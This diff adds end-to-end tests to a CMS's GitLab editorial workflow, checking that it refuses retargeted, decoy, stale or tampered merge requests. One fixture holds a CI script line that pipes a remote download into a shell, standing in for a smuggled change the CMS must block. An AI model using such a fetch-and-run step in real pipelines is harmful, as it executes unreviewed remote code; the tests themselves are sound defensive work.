@@ -371,3 +371,139 @@ test('starts over from a branch left over from an earlier merge request', async 
   // The new branch starts from the configured one, without the stale commit
   expect(gitlab.getHead('cms/posts/first-post').parents).toEqual([gitlab.head.oid]);
 });
+
+test('drops a labelled merge request moved to another target branch from the board', async ({
+  cms,
+  gitlab,
+  page,
+}) => {
+  // A merge request the CMS opened and labelled, whose target branch a maintainer then changed on
+  // GitLab. It goes somewhere the CMS doesn’t manage, so publishing the entry from the board would
+  // merge it into that branch instead
+  const moved = openEntryMergeRequest(gitlab, {
+    slug: 'second-post',
+    files: { 'content/posts/second-post.md': post('Second Post', 'Coming soon.') },
+  });
+
+  gitlab.createBranch('develop', gitlab.head.oid);
+  moved.targetBranch = 'develop';
+
+  await cms.open();
+
+  // The entry isn’t listed as unpublished, and the board has nothing on it
+  await expect(page.getByRole('grid', { name: 'Entries' }).getByRole('row')).toHaveText([
+    /First Post/,
+  ]);
+  await page.getByRole('radio', { name: 'Editorial Workflow' }).click();
+
+  const board = page.getByRole('group', { name: 'Editorial Workflow' });
+
+  // Wait for the board itself, or an empty column would read as one that hasn’t rendered yet
+  await expect(board.getByRole('list', { name: 'Drafts' })).toBeVisible();
+  await expect(board.getByRole('listitem')).toHaveCount(0);
+  // Its label is left as it stands, rather than moved as the entry changes status
+  expect(moved).toMatchObject({
+    targetBranch: 'develop',
+    state: 'opened',
+    labels: ['sveltia-cms/draft'],
+  });
+});
+
+test('refuses to save onto a workflow branch with a merge request to another branch', async ({
+  cms,
+  gitlab,
+  page,
+}) => {
+  // A workflow branch someone else is working on
+  gitlab.createBranch('cms/posts/first-post', gitlab.head.oid);
+  gitlab.commit(
+    { 'content/posts/draft-notes.md': post('Draft Notes', 'Someone else’s work.') },
+    { branch: 'cms/posts/first-post' },
+  );
+  gitlab.createBranch('develop', gitlab.head.oid);
+
+  // A merge request they opened from that branch to a branch the CMS doesn’t manage. It isn’t the
+  // entry’s, so the CMS must neither act on it, delete the branch it’s built on, which GitLab would
+  // close it along with, nor commit onto it: their work would then go out with the entry
+  const decoy = gitlab.openMergeRequest({
+    title: 'Tidy up the posts',
+    sourceBranch: 'cms/posts/first-post',
+    targetBranch: 'develop',
+  });
+
+  const branchHead = gitlab.refs.get('cms/posts/first-post');
+
+  await cms.open();
+
+  const editor = await openEntry(page, 'First Post');
+
+  await editor.getByRole('textbox', { name: 'Body' }).fill('Fresh draft.');
+  await editor.getByRole('button', { name: 'Save' }).click();
+
+  await expect(page.getByRole('alertdialog', { name: 'Error' })).toContainText(
+    'Another request (\u2068!1\u2069) is already open for this entry outside the CMS.',
+  );
+  expect(gitlab.mergeRequests).toHaveLength(1);
+  expect(decoy).toMatchObject({
+    title: 'Tidy up the posts',
+    targetBranch: 'develop',
+    state: 'opened',
+    labels: [],
+  });
+  expect(gitlab.refs.get('cms/posts/first-post')).toBe(branchHead);
+});
+
+test('refuses to publish an entry whose merge request changes other files', async ({
+  cms,
+  gitlab,
+  page,
+}) => {
+  // A developer can push a branch but not merge into the configured branch, which is GitLab’s
+  // default. A change to the site’s code slipped into what looks like an ordinary entry on the
+  // board would otherwise go live when a maintainer publishes it
+  const mergeRequest = openEntryMergeRequest(gitlab, {
+    slug: 'second-post',
+    files: {
+      'content/posts/second-post.md': post('Second Post', 'Coming soon.'),
+      '.gitlab-ci.yml': 'deploy:\n  script: curl https://example.com | sh\n',
+    },
+    status: 'pending_publish',
+  });
+
+  await cms.open();
+  await publish(page, await openEntry(page, 'Second Post'));
+
+  await expect(page.getByRole('alert')).toContainText(
+    'This entry can’t be published here, because it comes with other changes the CMS can’t show you.',
+  );
+  expect(mergeRequest.state).toBe('opened');
+  expect(gitlab.readFile('.gitlab-ci.yml')).toBeUndefined();
+});
+
+test('refuses to publish an entry whose branch has moved on since it was opened', async ({
+  cms,
+  gitlab,
+  page,
+}) => {
+  const mergeRequest = openEntryMergeRequest(gitlab, {
+    slug: 'second-post',
+    files: { 'content/posts/second-post.md': post('Second Post', 'Coming soon.') },
+    status: 'pending_publish',
+  });
+
+  await cms.open();
+
+  const editor = await openEntry(page, 'Second Post');
+
+  // Pushed after the entry has been reviewed, so publishing would merge what nobody has seen
+  gitlab.commit(
+    { 'content/posts/second-post.md': post('Second Post', 'Something else entirely.') },
+    { branch: 'cms/posts/second-post' },
+  );
+  await publish(page, editor);
+
+  await expect(page.getByRole('alert')).toContainText(
+    'The entry has been changed since you opened it.',
+  );
+  expect(mergeRequest.state).toBe('opened');
+});
